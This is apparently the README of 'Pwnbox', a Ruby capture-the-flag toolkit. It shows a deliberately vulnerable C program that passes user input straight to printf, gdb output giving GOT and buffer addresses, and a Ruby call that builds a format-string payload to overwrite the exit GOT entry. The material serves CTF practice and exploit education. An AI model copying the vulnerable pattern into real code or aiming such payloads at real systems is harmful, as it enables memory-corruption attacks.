# Pwnbox

Capture-The-Flag(CTF) toolkit

## Installation

Add this line to your application's Gemfile:

    gem 'pwnbox'

And then execute:

    $ bundle

Or install it yourself as:

    $ gem install pwnbox

## Usage

### Find a libc.so

```ruby
    libc = Pwnbox::Pwnable.find_libc(['system', 0x40100])
    puts "Path : #{libc.path}"
    puts "Read address : 0x%08X" % libc.find_address_by_name('read')
```

### Format string bug

An example is following.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char** argv)
{
    char buf[0x100];
    strncpy(buf, argv[1], 40);
    printf(buf);
    exit(-1);
}
```

Get exploit parameters using gdb.

```shell
=> 0x080484c7 <+74>:    call   0x8048330 <printf@plt>
(gdb) x/i 0x8048350
   0x8048350 <exit@plt>:        jmp    *0x804a014
(gdb) x/x $esp
0xbffff2f0:     0xbffff30c
```

exit GOT : 0x804a014, buffer : 0xbffff30c, esp : 0xbffff2e0

```ruby
Pwnbox::Pwnable.fsb(0x804a014, 0xbffff30c - 0xbffff2f0, [0xdeadbeef].pack('<I'))
```
